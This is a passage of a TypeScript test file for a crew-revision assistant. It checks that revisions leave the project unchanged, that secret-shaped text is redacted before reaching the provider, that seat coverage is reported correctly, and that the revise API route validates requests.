  it("writes nothing", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const before = await readConfig(project);
    const rolesBefore = await listRoles(project);
    const roleBytesBefore = await Promise.all(
      rolesBefore.map((name) =>
        fs.readFile(path.join(projectRolesDir(project), name), "utf8"),
      ),
    );

    const revised = {
      label: "Duo, revised",
      roles: {
        "duo-planner": role({ profile, promptText: `${PLANNER_PROMPT}\n\nAlso name the risks.` }),
        "duo-reviewer": role({
          label: "Reviewer",
          seats: ["reviewer"],
          profile,
          permissions: "read_only",
          promptText: REVIEWER_PROMPT,
        }),
      },
    };
    const { runner } = scriptedRunner([revisionJson({ crew: revised })]);

    await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "default",
      crew: editedCrew(profile),
      instruction: "swap the builder for a reviewer and sharpen the planner",
      runner,
    });

    expect(await readConfig(project)).toBe(before);
    expect(await listRoles(project)).toEqual(rolesBefore);
    expect(
      await Promise.all(
        rolesBefore.map((name) =>
          fs.readFile(path.join(projectRolesDir(project), name), "utf8"),
        ),
      ),
    ).toEqual(roleBytesBefore);
    // The crew whose id the revision carries is untouched too.
    const { config } = await loadConfig(project);
    expect(Object.keys(config.crews.default!.roles)).not.toContain("duo-reviewer");
  });

  // The crew being edited is a NEW carrier into the prompt - a role's
  // instructions are free text the owner typed. What this proves is the end
  // state: nothing secret-shaped reaches the provider, wherever the redaction
  // lives (today `runAssist`, the single funnel).
  it("nothing secret-shaped in the crew being edited reaches the provider", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner, prompts } = scriptedRunner([revisionJson({})]);

    await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile, {
        "duo-planner": role({
          profile,
          promptText: `${PLANNER_PROMPT}\n\nThe deploy key is AKIAIOSFODNN7EXAMPLE.`,
        }),
      }),
      instruction: "is this planner well written?",
      runner,
    });
    expect(prompts[0]).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(prompts[0]).toContain("[REDACTED");
  });
});

describe("crew-assist: seat coverage is computed, never claimed", () => {
  /** Coverage of a crew, with no revision in the way. */
  async function coverageOf(
    project: string,
    roles: Record<string, unknown>,
  ): Promise<Awaited<ReturnType<typeof reviseCrewFromInstruction>>["coverage"]> {
    const { runner } = scriptedRunner([revisionJson({ answer: "Nothing to change." })]);
    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: { label: "Duo", roles },
      instruction: "which seats are uncovered?",
      runner,
    });
    return result.coverage;
  }

  it("reports who takes each seat this project's flows ask for", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const coverage = await coverageOf(project, defaultRoles(profile));

    // Hand-computed against the built-in `default` flow, which seats planner,
    // architect, implementer, reviewer, fixer and verifier. This crew has one
    // role on `planner` and one on `implementer`, and nothing else.
    expect(seatFill(coverage, "planner")).toMatchObject({
      roleIds: ["duo-planner"],
      status: "filled",
    });
    expect(seatFill(coverage, "implementer")).toMatchObject({
      roleIds: ["duo-builder"],
      status: "filled",
    });
    for (const uncovered of ["architect", "reviewer", "fixer", "verifier"]) {
      expect(seatFill(coverage, uncovered)).toMatchObject({ roleIds: [], status: "gap" });
    }
    // Each seat names the flows that ask for it, which is what makes "why is
    // this seat uncovered?" answerable rather than a matter of opinion.
    expect(seatFill(coverage, "architect").flowIds).toContain("default");
    expect(coverage.idleRoleSeats).toEqual([]);
  });

  it("reports a seat two roles fight over as ambiguous", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const coverage = await coverageOf(project, {
      "duo-planner": role({ profile }),
      "duo-second-planner": role({ profile, label: "Second planner" }),
    });
    expect(seatFill(coverage, "planner")).toMatchObject({
      roleIds: ["duo-planner", "duo-second-planner"],
      status: "ambiguous",
    });
  });

  it("names a seat a role claims that no flow asks for", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // A near-miss on a seat name is silent everywhere else: the role validates,
    // the crew saves, and it simply never runs.
    const coverage = await coverageOf(project, {
      "duo-planner": role({ profile, seats: ["planner", "implementor"] }),
    });
    expect(coverage.idleRoleSeats).toEqual(["implementor"]);
    expect(coverage.seats.map((s) => s.seatId)).not.toContain("implementor");
  });
});

// Route-level cover. The service tests above inject a fake runner; nothing can
// inject one over HTTP, so these drive the real provider path through a fake
// CLI and assert what only the route owns: the body schema, the error mapping,
// and that a revision leaves the project exactly as it found it.
describe("POST /api/crews/revise", () => {
  let server: StartedServer | null = null;
  afterEach(async () => {
    await server?.close();
    server = null;
  });

  /** A fake provider CLI answering the crew-revise prompt. `runAssist` stamps
   *  the label into the prompt header, so the branch is on that rather than on
   *  any wording the test controls; a question and an edit are two different
   *  right answers from one endpoint. */
  function fakeCliSource(profile: string): string {
    const revised = revisionJson({
      crew: {
        label: "Duo",
        roles: {
          ...defaultRoles(profile),
          "duo-reviewer": role({
            label: "Reviewer",
            seats: ["reviewer"],
            profile,
            permissions: "read_only",
            promptText: REVIEWER_PROMPT,
          }),
        },
      },
    });
    const question = revisionJson({ answer: "No role in this crew takes that seat." });
    return `#!/usr/bin/env node
let i='';process.stdin.on('data',c=>i+=c);process.stdin.on('end',()=>{
  console.log(i.includes('why is') ? ${JSON.stringify(question)} : ${JSON.stringify(revised)});
});
`;
  }

  async function serveProject(): Promise<{ project: string; profile: string }> {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const fakeJs = path.join(project, "fake.js");
    await fs.writeFile(fakeJs, fakeCliSource(profile), { mode: 0o755 });
    await fs.chmod(fakeJs, 0o755);
    await setConfigValue(
      project,
      "providers.fake",
      JSON.stringify({ type: "cli", command: "node", args: [fakeJs], input: "stdin" }),
    );
    // The assist resolves its provider from the crew planner's profile.
    await setConfigValue(project, `profiles.${profile}.provider`, "fake");
    server = await startServer({ projectRoot: project, port: 0, host: "127.0.0.1" });
    return { project, profile };
  }

  async function post(body: unknown): Promise<Response> {
    return fetch(`${server!.url}/api/crews/revise`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
  }

  it("returns a revision, its coverage, and changes nothing on disk", async () => {
    const { project, profile } = await serveProject();
    const before = await readConfig(project);
    const rolesBefore = await listRoles(project);

    const res = await post({
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "add a reviewer",
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      revision: {
        crew: { roles: Record<string, { promptText?: string }> };
        addedRoleIds: string[];
        removedRoleIds: string[];
        coverage: { seats: Array<{ seatId: string; status: string; roleIds: string[] }> };
        problems: string[];
      } | null;
      answer: string;
      coverage: { seats: Array<{ seatId: string; status: string }> };
    };
    expect(body.revision!.addedRoleIds).toEqual(["duo-reviewer"]);
    // Over the wire in the shape the editor sent, instructions included.
    expect(Object.keys(body.revision!.crew.roles).sort()).toEqual([
      "duo-builder",
      "duo-planner",
      "duo-reviewer",
    ]);
    expect(body.revision!.crew.roles["duo-reviewer"]!.promptText).toBe(REVIEWER_PROMPT);
    expect(
      body.revision!.coverage.seats.find((s) => s.seatId === "reviewer"),
    ).toMatchObject({ status: "filled", roleIds: ["duo-reviewer"] });
    expect(body.answer.length).toBeGreaterThan(0);

    expect(await readConfig(project)).toBe(before);
    expect(await listRoles(project)).toEqual(rolesBefore);
  });

  it("returns the answer alone when the instruction was a question", async () => {
    const { profile } = await serveProject();
    const res = await post({
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "why is the architect seat uncovered?",
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      revision: unknown;
      answer: string;
      coverage: { seats: Array<{ seatId: string; status: string }> };
    };
    // A question is a 200 with nothing to apply, never an error.
    expect(body.revision).toBeNull();
    expect(body.answer).toContain("seat");
    expect(body.coverage.seats.find((s) => s.seatId === "architect")).toMatchObject({
      status: "gap",
    });
  });

  it("rejects a body the route does not recognise", async () => {
    const { profile } = await serveProject();
    expect(
      (await post({ crewId: "duo", crew: editedCrew(profile), instruction: "hi", extra: 1 }))
        .status,
    ).toBe(400);
    expect((await post({ crewId: "duo", crew: editedCrew(profile) })).status).toBe(400);
    expect(
      (await post({ crewId: "duo", crew: editedCrew(profile), instruction: "a".repeat(1001) }))
        .status,
    ).toBe(400);
  });

  it("maps a crew it cannot read to a 400 that names the field", async () => {
    const { profile } = await serveProject();
    const { permissions: _dropped, ...noPermissions } = role({ profile });
    const res = await post({
      crewId: "duo",
      crew: editedCrew(profile, { "duo-planner": noPermissions }),
      instruction: "add a reviewer",
    });
    expect(res.status).toBe(400);
    const body = (await res.json()) as { message?: string; error?: string };
    expect(JSON.stringify(body)).toContain("permissions");
  });
});
